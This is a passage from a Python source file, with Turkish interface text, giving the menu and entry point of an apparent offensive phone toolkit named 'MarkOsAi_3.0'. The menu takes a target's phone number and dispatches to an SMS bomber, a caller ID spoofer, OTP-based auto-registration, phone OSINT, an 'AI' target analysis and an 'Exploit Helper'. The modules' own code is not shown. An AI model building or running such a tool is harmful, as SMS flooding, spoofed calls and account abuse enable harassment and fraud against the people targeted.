                        print(f"{BOLD}Ülkeler:{RESET}")
                        for i, c in enumerate(countries, 1):
                            print(f"  {i}. {c}")
                        c_idx = int(input(f"{BLUE}[?]{RESET} Ülke: "))
                        country = countries[c_idx - 1]
                        otp_sim.auto_register_flow(p_choice, country)
                    except Exception as e:
                        cprint(f"Hata: {e}", RED)
                elif sub == "b":
                    try:
                        p_choice = input(f"{BLUE}[?]{RESET} Platform (1-10): ")
                        if p_choice not in PLATFORMS:
                            continue
                        phone = input(f"{BLUE}[?]{RESET} Telefon numarası: ")
                        otp_data = otp_sim.simulate_otp(p_choice, phone)
                        if otp_data:
                            otp_sim.display_otp(otp_data)
                        else:
                            cprint("Geçersiz platform!", RED)
                    except Exception as e:
                        cprint(f"Hata: {e}", RED)

            # ─── 3: MarkOsAi_3.0 ───
            elif secim == "3":
                banner()
                ai = MarkOsAi()
                print(f"""
  {BOLD}MarkOsAi_3.0 Modları:{RESET}
  {GREEN}1{RESET}  Hedef Analiz (Platform + Numara bazlı)
  {GREEN}2{RESET}  Sohbet / Soru-Cevap
  {GREEN}3{RESET}  Bilgi Tabanı
""")
                ai_secim = input(f"{BLUE}[?]{RESET} Seçim (1-3): ").strip()

                if ai_secim == "1":
                    platform = input("Hedef platform (örn. WhatsApp): ")
                    phone = input("Hedef numara: ")
                    analysis = ai.analyze_target(platform, phone)
                    print(ai.generate_report(analysis))
                elif ai_secim == "2":
                    ai.interactive_chat()
                elif ai_secim == "3":
                    print(f"\n{BOLD}MarkOsAi Bilgi Tabanı:{RESET}")
                    for key, data in ai.knowledge_base.items():
                        print(f"\n  {CYAN}{data['title']}{RESET} [{RED}{data['risk_level']}{RESET}]")
                        for t in data["techniques"]:
                            print(f"    ▸ {t}")

            # ─── 4: OSINT ───
            elif secim == "4":
                banner()
                phone = input(f"{BLUE}[?]{RESET} Telefon numarası: ")
                result = OSINTPhone.scan_number(phone)
                OSINTPhone.display_scan(result)

            # ─── 5: SMS Bomber ───
            elif secim == "5":
                banner()
                phone = input(f"{BLUE}[?]{RESET} Hedef numara: ")
                try:
                    count = int(input(f"{BLUE}[?]{RESET} SMS sayısı (max 100): "))
                    count = min(count, 100)
                except ValueError:
                    count = 20
                bomber = SMSBomber()
                bomber.stress_test(phone, count)

            # ─── 6: Caller ID Spoofer ───
            elif secim == "6":
                banner()
                target = input(f"{BLUE}[?]{RESET} Hedef numara: ")
                fake = input(f"{BLUE}[?]{RESET} Görünecek numara: ")
                result = CallerIDSpoofer.spoof_call(target, fake)
                CallerIDSpoofer.display(result)

            # ─── 7: Crypto ───
            elif secim == "7":
                CryptoUtils.menu()

            # ─── 8: Exploit Helper ───
            elif secim == "8":
                ExploitHelper.menu()

            # ─── 0: Çıkış ───
            elif secim == "0":
                cprint("\nMarkOsAi_3.0 kapatılıyor... Güle güle!", GREEN)
                time.sleep(0.5)
                print()
                sys.exit(0)

            else:
                cprint("Geçersiz seçim! Tekrar deneyin.", RED)

            if secim != "0":
                input(f"\n{YELLOW}[DEVAM ETMEK İÇİN ENTER]...{RESET}")

        except KeyboardInterrupt:
            cprint("\n\n[!] Çıkış yapılıyor...", YELLOW)
            sys.exit(0)
        except Exception as e:
            cprint(f"\n[!] Beklenmeyen hata: {e}", RED)
            time.sleep(1)


# ═══════════════════════════════════════════════════
#  GİRİŞ NOKTASI
# ═══════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        # Sistem kontrolü
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")

        banner()
        typewriter(f"{BOLD}MarkOsAi_3.0{RESET} yükleniyor...", 0.02)
        time.sleep(0.3)
        loading_animation("Modüller başlatılıyor", 1.0)
        loading_animation("AI çekirdeği aktive ediliyor", 0.8)
        loading_animation("Sistem hazır", 0.5)

        cprint(f"\n{BOLD}{GREEN}✔ MarkOsAi_3.0 başarıyla başlatıldı!{RESET}")
        cprint(f"  Toplam {len(COUNTRY_DB)} ülke, {len(PLATFORMS)} platform destekleniyor.\n", CYAN)

        main_menu()

    except KeyboardInterrupt:
        cprint("\nGüle güle!", GREEN)
    except Exception as e:
        cprint(f"\nKritik hata: {e}", RED)
        sys.exit(1)
